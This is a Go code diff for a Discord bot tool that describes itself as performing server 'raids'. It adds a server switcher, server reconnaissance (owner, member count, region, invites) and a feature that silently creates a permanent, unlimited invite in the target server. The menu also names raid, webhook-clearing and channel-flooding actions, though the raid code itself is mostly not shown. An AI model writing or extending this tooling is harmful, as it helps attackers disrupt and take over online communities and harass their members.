@@ -19,7 +19,7 @@ import (
 	"github.com/bwmarrin/discordgo"
 )
 
-// variables that needed to be glo
+// variables that are used to perform the raids
 var (
 	server   *discordgo.UserGuild
 	channels []*discordgo.Channel
@@ -81,7 +81,6 @@ func main() {
 	serverIndInt, err := strconv.Atoi(serverIndStr)
 	if err != nil {
 
-		// error while converting it to an int
 		fmt.Printf("[err]: %s is not a number...\n", serverIndStr)
 		fmt.Printf("       %v\n", err)
 		os.Exit(1)
@@ -111,10 +110,11 @@ func main() {
 		fmt.Println()
 		fmt.Println(" 1. start the raid")
 		fmt.Println(" 2. open tool menu")
-		fmt.Println(" 3. exit")
+		fmt.Println(" 3. change server")
+		fmt.Println(" 4. exit")
 		fmt.Println()
 
-		switch question("select an option", []string{"1", "2", "3"}) {
+		switch question("select an option", []string{"1", "2", "3", "4"}) {
 
 		case "1":
 			code := strconv.Itoa(randint(100000, 999999))
@@ -190,10 +190,11 @@ func main() {
 			fmt.Println(" 1. get server info")
 			fmt.Println(" 2. clear webhooks")
 			fmt.Println(" 3. fill channel list")
-			fmt.Println(" 4. back")
+			fmt.Println(" 4. retrieve invite code")
+			fmt.Println(" 5. back")
 			fmt.Println()
 
-			switch question("select an option", []string{"1", "2", "3"}) {
+			switch question("select an option", []string{"1", "2", "3", "4", "5"}) {
 
 			case "1":
 				guild, err := dg.Guild(server.ID)
@@ -232,11 +233,32 @@ func main() {
 
 				}
 
+				invites, err := dg.GuildInvites(guild.ID)
+				if err != nil {
+
+					fmt.Printf("[err]: unable to retrieve the invites for the selected server... (continuing anyways)")
+					fmt.Printf("       %v\n", err)
+
+				}
+
+				var invite string
+				if len(invites) != 0 {
+
+					invite = invites[0].Code
+
+				} else {
+
+					invite = "none"
+
+				}
+
 				fmt.Println()
 				fmt.Printf("guild info for %s:\n", guild.Name)
+				fmt.Printf("  region: %s\n", guild.Region)
 				fmt.Printf("  channel count: %d\n", len(channels))
 				fmt.Printf("  webhook count: %d\n", len(hooks))
 				fmt.Printf("  member count: %d\n", guild.MemberCount)
+				fmt.Printf("  first available invite: %s\n", invite)
 				fmt.Printf("  owner:\n")
 				fmt.Printf("    id: %s\n", owner.ID)
 				fmt.Printf("    name: %s\n", owner.String())
@@ -298,9 +320,105 @@ func main() {
 
 				fmt.Printf("finished adding %d channel(s)...\n", 100-len(channels))
 
+			case "4":
+				invites, err := dg.GuildInvites(server.ID)
+				if err != nil {
+
+					fmt.Printf("[err]: unable to retrieve the invites for the selected server... (continuing anyways)")
+					fmt.Printf("       %v\n", err)
+
+				}
+
+				var invite string
+				if len(invites) == 0 {
+
+					allChannels, err := dg.GuildChannels(server.ID)
+					if err != nil {
+
+						fmt.Printf("[err]: unable to retrieve the channels for the selected server...\n")
+						fmt.Printf("       %v\n", err)
+						os.Exit(1)
+
+					}
+
+					channels = []*discordgo.Channel{}
+
+					for _, channel := range allChannels {
+
+						if channel.Type == discordgo.ChannelTypeGuildText {
+
+							channels = append(channels, channel)
+
+						}
+
+					}
+
+					inviteTmp, err := dg.ChannelInviteCreate(channels[0].ID, discordgo.Invite{
+						MaxAge:    0,
+						MaxUses:   0,
+						Temporary: false,
+					})
+					if err != nil {
+
+						fmt.Printf("[err]: unable to create an invite for the selected server...\n")
+						fmt.Printf("       %v\n", err)
+						os.Exit(1)
+
+					}
+
+					invite = inviteTmp.Code
+
+				} else {
+
+					invite = invites[0].Code
+
+				}
+
+				fmt.Println()
+				fmt.Printf("invite code: %s", invite)
+				fmt.Println()
+
 			}
 
 		case "3":
+			servers, err := dg.UserGuilds(100, "", "")
+			if err != nil {
+
+				fmt.Printf("[err]: could not retrieve the guilds for the bot...\n")
+				fmt.Printf("       %v\n", err)
+				os.Exit(1)
+
+			}
+
+			for i, s := range servers {
+
+				fmt.Printf("%d: %s\n", i, s.Name)
+
+			}
+
+			serverIndStr := question("select a server", []string{})
+
+			serverIndInt, err := strconv.Atoi(serverIndStr)
+			if err != nil {
+
+				fmt.Printf("[err]: %s is not a number...\n", serverIndStr)
+				fmt.Printf("       %v\n", err)
+				os.Exit(1)
+
+			}
+
+			if len(servers) > serverIndInt {
+
+				server = servers[serverIndInt]
+
+			} else {
+
+				fmt.Printf("[err]: %s is not in the server list...\n", serverIndStr)
+				os.Exit(1)
+
+			}
+
+		case "4":
 			os.Exit(0)
 
 		}
